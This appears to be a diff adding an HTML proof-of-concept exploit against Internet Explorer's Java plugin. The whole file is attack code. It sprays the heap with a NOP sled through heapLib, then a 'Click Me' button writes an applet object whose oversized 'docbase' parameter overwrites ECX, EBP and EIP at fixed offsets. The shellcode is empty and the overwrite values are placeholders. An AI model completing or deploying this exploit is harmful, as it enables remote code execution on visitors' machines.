@@ -1,0 +1,75 @@
+<html>
+<head>
+   <link rel="shortcut icon" href="http://127.0.0.1:9999/x.ico" />
+   <script src="heaplib.js"></script>
+
+   <script>
+   function packv(n) {
+      var s = new Number(n).toString(16);
+      while(s.length < 8) s = "0" + s;
+      return(unescape("%u" + s.substring(4,8) + "%u" + s.substring(0,4)));
+   }
+
+   function spray_heap() {
+      heap = new heapLib.ie(0x20000);
+
+      var payload, block1, nopsled1;
+    
+      payload = "";
+
+      block1 = unescape("%u9090%u9090");
+
+      // build nopsled1
+      nopsled1 = payload;
+      while(nopsled1.length < 0x1000)
+         nopsled1 += block1;
+
+      var heapblock1 = nopsled1;
+
+      while(heapblock1.length < 0x40000)
+         heapblock1 += heapblock1;
+
+      var trimmedblock1 = heapblock1.substring(2, 0x40000 - 0x21);
+
+      // heap spray
+      for(var i = 0 ; i < 800 ; i++)
+         heap.alloc(trimmedblock1);
+   }
+
+   function trigger() {
+      var offsetECX = 376;
+      var offsetEBP = 388;
+      var offsetEIP = 392;
+      var buf = "";
+
+      for(i = 0; i <= offsetEIP; i+=4) {
+         var fill;
+
+         if(i === offsetECX)
+            fill = "%43%43%43%43";
+         else if(i === offsetEBP)
+            fill = "%42%42%42%42";
+         else if(i === offsetEIP)
+            // jump to gadget `leave; ret`
+            fill = "%41%41%41%41";
+         else
+            fill = "%41%41%41%41";
+         
+         buf += unescape(fill);
+      }
+
+      var htmlTags =
+         "<object type='application/x-java-applet'>" +
+         "<param name='launchjnlp' value='1'>" +
+         "<param name='docbase' value='" + buf + "'>" +
+         "</object>";
+
+      document.write(htmlTags);
+   }
+   </script>
+</head>
+<body onload="spray_heap()">
+   <input type="button" value="Click Me" onclick="trigger()">
+</body>
+</html>
+
